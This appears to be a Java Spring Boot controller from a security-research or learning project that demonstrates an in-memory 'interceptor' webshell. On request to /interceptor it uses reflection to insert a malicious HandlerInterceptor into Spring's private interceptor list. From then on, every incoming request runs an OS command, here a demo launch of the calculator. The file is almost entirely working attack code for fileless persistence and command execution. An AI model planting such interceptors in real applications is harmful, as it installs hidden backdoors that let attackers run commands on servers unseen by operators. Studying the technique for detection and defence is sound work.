package com.yyjccc.webshell.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.List;

@RestController
public class InterceptorController {

	@RequestMapping("/interceptor")
	public String ShellInterceptor() throws NoSuchFieldException, IllegalAccessException {
		WebApplicationContext context=  RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
		//获取RequestMapping中的adaptedInterceptors
		AbstractHandlerMapping abstractMapping= (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
		Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
		field.setAccessible(true);
		List<HandlerInterceptor> interceptors= (List<HandlerInterceptor>) field.get(abstractMapping);
		//放入interceptor
		interceptors.add(new Shell_Interceptor());
		field.set(abstractMapping,interceptors);
		return "shell3";
	}


	public class Shell_Interceptor implements HandlerInterceptor{
		@Override
		public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
			System.out.println("Interceptor内存马");
			Runtime.getRuntime().exec("calc");
			return true;
		}
	}
}
